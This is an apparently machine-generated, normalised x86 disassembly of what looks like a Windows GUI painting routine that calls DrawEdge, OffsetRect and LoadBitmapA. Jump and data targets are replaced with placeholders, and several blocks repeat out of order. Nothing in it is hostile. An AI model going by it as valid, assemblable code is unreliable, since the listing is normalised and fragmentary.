mov edx [ edx - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x28 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
movzx eax [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_3abf108
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_3a89b20
mov eax [ ebp + 0x8 ]
inc [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
call sub_3aa3bd8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x44 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
movzx edx [ r-xdata ]
call sub_3a895b4
mov eax [ ebp + 0x8 ]
or [ eax - 0x38 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x1c ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x24 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x24 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x24 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
pop ecx
call sub_3a89e58
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
call sub_3a89220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_3a64380
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
call sub_3aa3bd8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa52c1
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
movzx eax [ eax + 0x60 ]
call sub_3aa2bd4
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
call sub_3aa3bd8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
call OffsetRect
sub_3aa52d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_3aa5c52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a89f04
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_3a89b20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_3a89b20
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x24 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_3a89220
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_3a89b20
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a89f04
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x28 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x1c ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x32 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_3abee18
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffd8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_3a89b18
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_3a89b20
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x28 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x20 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x28 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_3a89b20
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a89f04
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_3a89b18
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_3a90704
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_3a89af4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a89f04
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x38 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x56 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a89f04
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x24 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x20 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x28 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov edx [ ebp + 0x8 ]
mov [ edx - 0x54 ] eax
xor eax eax
push ebp
push sub_3aa576c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_3a8f384
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_3a89220
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0x24 ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_3abee18
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_3a89b20
mov eax [ ebp + 0x8 ]
dec [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
call sub_3aa3bd8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x44 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
movzx edx [ r-xdata ]
call sub_3a895b4
mov eax [ ebp + 0x8 ]
or [ eax - 0x38 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a050
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x48 ]
lea edi [ edx - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x24 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x20 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x28 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x28 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
movzx eax [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_3abf108
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x1c ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x24 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x24 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x24 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
pop ecx
call sub_3a89e58
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
call sub_3a89220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_3a64380
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
call sub_3aa3bd8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa5c59
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x57 ] 0x0
je r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
call OffsetRect
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
movzx eax [ eax + 0x60 ]
call sub_3aa2bd4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_3a8a19c
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ecx [ ebp - 0x4 ]
call sub_3aa3bd8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
sub_3aa5e18
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_3aa6c54
test eax eax
